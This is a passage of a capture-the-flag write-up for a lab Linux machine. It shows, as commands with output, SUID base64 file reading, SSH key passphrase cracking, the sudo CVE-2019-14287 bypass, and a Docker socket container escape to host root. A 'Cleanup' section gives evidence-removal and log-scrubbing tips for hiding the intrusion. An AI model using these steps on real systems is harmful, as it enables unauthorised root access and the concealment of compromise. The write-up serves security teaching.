drwxr-x---  3 penelope penelope  4096 Jan 12  2021 .
drwxr-xr-x 45 root     root      4096 Jan 12  2021 ..
-rwsr-sr-x  1 maya     maya     39096 Jan 12  2021 base64
lrwxrwxrwx  1 penelope penelope     9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 penelope penelope   220 Jan 12  2021 .bash_logout
-rw-r--r--  1 penelope penelope  3771 Jan 12  2021 .bashrc
-rw-r--r--  1 penelope penelope  8980 Jan 12  2021 examples.desktop
-r--------  1 penelope penelope    43 Jan 12  2021 flag.txt
drwx------  3 penelope penelope  4096 Jan 12  2021 .gnupg
-rw-r--r--  1 penelope penelope   807 Jan 12  2021 .profile
```

The **Maya** flag was captured from `/home/maya` by reading through the SUID binary:

```bash
penelope@linuxagency:~$ ./base64 /home/maya/flag.txt | base64 -d
<<MAYA_FLAG>>
```

---

### Robert — SSH Key Cracking & Internal Pivot (`maya` → `robert`)

Further enumeration of `/etc/ssh/sshd_config` revealed that SSH access was allowed for specific users, including `maya`:

```
AllowUsers      agent47 root    maya    penelope
```

This allowed authentication into SSH using the flag discovered as a password. Enumeration of Maya's directory revealed the private and public SSH keys belonging to the user `robert`. This private key was copied to the attacker's machine and saved as `id_rsa`.

The passphrase for the private SSH key was cracked using **John the Ripper**:

```bash
┌──(root㉿vbox)-[~/Desktop/linuxagen]
└─# ssh2john id_rsa > key.txt

┌──(root㉿vbox)-[~/Desktop/linuxagen]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt key.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)

┌──(root㉿vbox)-[~/Desktop/linuxagen]
└─# john --show key.txt
id_rsa:{REDACTED}

1 password hash cracked, 0 left
```

A traceback of earlier enumeration steps confirmed that port `2222` was bound to localhost only, as previously identified during Mission 24. The service was verified as SSH:

```bash
maya@linuxagency:~$ nc 127.0.0.1 2222
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
```

Since the service was bound to localhost, it could only be accessed from within the compromised system, making it an internal pivot point rather than an externally reachable service.

A connection was then established as user `robert` using the private SSH key and the cracked passphrase:

```bash
maya@linuxagency:~/old_robert_ssh$ ssh -i id_rsa robert@localhost -p 2222
The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.
ECDSA key fingerprint is SHA256:tHRuLtVLrzk2hp6qNgrziq6NZKkEQY+rN1E1J7K7lIE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[localhost]:2222' (ECDSA) to the list of known hosts.
robert@localhost's password:
Last login: Tue Jan 12 17:02:07 2021 from 172.17.0.1
robert@ec96850005d6:~$ whoami
robert
```

There was no `user.txt` in `/home/robert`, and instead a warning message about ICA was found:

```bash
robert@ec96850005d6:~$ cat robert.txt
You shall not pass from here!!!

I will not allow ICA to take over my world.
```

---

### Container Root — CVE-2019–14287 (`robert` → `root` in container)

The `sudo -l` command revealed that the user could execute `/bin/bash` as any user **except root** without a password:

```bash
robert@ec96850005d6:~$ sudo -l
Matching Defaults entries for robert on ec96850005d6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on ec96850005d6:
    (ALL, !root) NOPASSWD: /bin/bash
```

The sudo version was identified as vulnerable to **CVE-2019–14287**, which allows bypassing user restrictions defined in sudo policies. This vulnerability occurs because sudo incorrectly handles user IDs — specifying `-1` is internally interpreted as `0`, which corresponds to the root user.

> More details: [OffSec Exploit Database — CVE-2019-14287](https://www.exploit-db.com/exploits/47502)

The following command was used to escalate to root within the container:

```bash
robert@ec96850005d6:~$ sudo -u#-1 /bin/bash
root@ec96850005d6:~# whoami
root
```

The **User** flag was captured from `/root` inside the container:

```bash
root@ec96850005d6:~# whoami
root
root@ec96850005d6:~# cd /root
root@ec96850005d6:/root# ls
success.txt  user.txt
root@ec96850005d6:/root# cat user.txt
<<USER_FLAG>>
```

---

### Host Root — Docker Socket Escape (container → host)

Another message indicated that an alternate path must be used to return to the agency, and the root flag had not yet been discovered. This confirmed that the current environment was a Docker container and that root privileges were limited to the container — not the underlying host.

A Docker binary was discovered in `/tmp`. The available containers were listed, and the Docker socket file was confirmed in `/var/run`:

```bash
root@ec96850005d6:/root# cd /tmp
root@ec96850005d6:/tmp# /tmp/docker ps
CONTAINER ID        IMAGE               COMMAND               CREATED             STATUS              PORTS                    NAMES
ec96850005d6        mangoman            "/usr/sbin/sshd -D"   5 years ago         Up 3 hours          127.0.0.1:2222->22/tcp   kronstadt_industries
root@ec96850005d6:/tmp# ls -l /var/run/docker.sock
srw-rw---- 1 root 127 0 Apr 14 19:34 /var/run/docker.sock
```

The presence of `/var/run/docker.sock` indicated that the Docker daemon could be accessed from within the container. This is a critical misconfiguration, as it allows interaction with the host system through Docker.

The following command was used to escape the container and gain root access on the host:

```bash
/tmp/docker run -v /:/mnt --rm -it mangoman chroot /mnt sh
```

> This command mounts the host filesystem (`/`) into the container at `/mnt` and performs a `chroot`, effectively escaping the container and gaining root access on the host system.

> **Note:** Direct interaction with the Docker socket is highly sensitive and typically restricted or monitored in production environments. In real-world scenarios, minimal interaction or indirect container abuse techniques are used to avoid detection while achieving host-level access.

```bash
root@ec96850005d6:/tmp# /tmp/docker run -v /:/mnt --rm -it mangoman chroot /mnt sh
# whoami
root
```

The **Root** flag was captured from `/root` on the host:

```bash
# whoami
root
# cd /root
# cat root.txt
<<ROOT_FLAG>> !!!
```

---

## Bonus: Direct Root via PwnKit

The easiest way to gain root privileges and capture both the user and root flags (as mentioned at the start) was to exploit the PwnKit vulnerability. Details of this vulnerability and its exploitation can be found in the following writeup:

> [Try Hack Me — Gaming Server (PwnKit Reference)](https://pulse-einher.medium.com)

---

## Cleanup Recommendations

- Lateral movement via repeated `su missionX` transitions should be correlated in `/var/log/auth.log`, and abnormal session traces across chained users should be cleaned to reduce visibility of privilege hopping.
- Temporary escalation artifacts such as `/tmp/random.py`, modified `PATH`/`PYTHONPATH`, and variables like `pocket=money` should be removed or reset to eliminate clear exploitation footprints.
- The cron-exploited script `/opt/scripts/47.sh` should be restored to its original state, removing any injected reverse shell payloads used during the writable window.
- All shells spawned via GTFOBins (`zip`, `git`, `less`, `vim`) and cron-triggered reverse connections should be terminated, ensuring no lingering elevated sessions remain active.
- Sensitive data accessed during escalation — such as `id_rsa`, decoded credentials from logs, and outputs from SUID `base64` abuse — should be deleted from attacker-accessible paths.
- Docker escape traces, including `/tmp/docker` usage, socket interaction, and host mount (`/mnt` via `chroot`), should be reviewed and cleaned to remove evidence of container-to-host compromise.

---

## Remediation Recommendations

- Enforce strict privilege boundaries by removing unnecessary `su` access between mission users and auditing PAM/sudo configurations to prevent unrestricted lateral movement across accounts.
- Secure cron job execution by preventing writable script windows (e.g., `/opt/scripts/47.sh`), enforcing root-only ownership, and avoiding periodic overwrites that expose race-condition abuse opportunities.
- Harden sudo configurations by removing dangerous GTFOBins mappings (`zip`, `git`, `less`, `vim`) and restricting execution contexts to prevent shell escapes via legitimate binaries.
- Prevent environment-based privilege escalation by disabling `SETENV` where not required and restricting user-controlled variables like `PYTHONPATH` that enable module hijacking.
- Restrict access to sensitive system components such as `/var/run/docker.sock`, and avoid exposing Docker binaries inside containers to eliminate container escape vectors.

---

## Conclusion

We are done with the machine……….

Let's move to the next, till then  
Have a good day (night too)

---

## Disclaimer

This content is intended for educational purposes only. All techniques demonstrated are performed in a controlled lab environment on machines explicitly provided for security research and learning. Unauthorized use of these techniques against real systems is illegal and unethical.
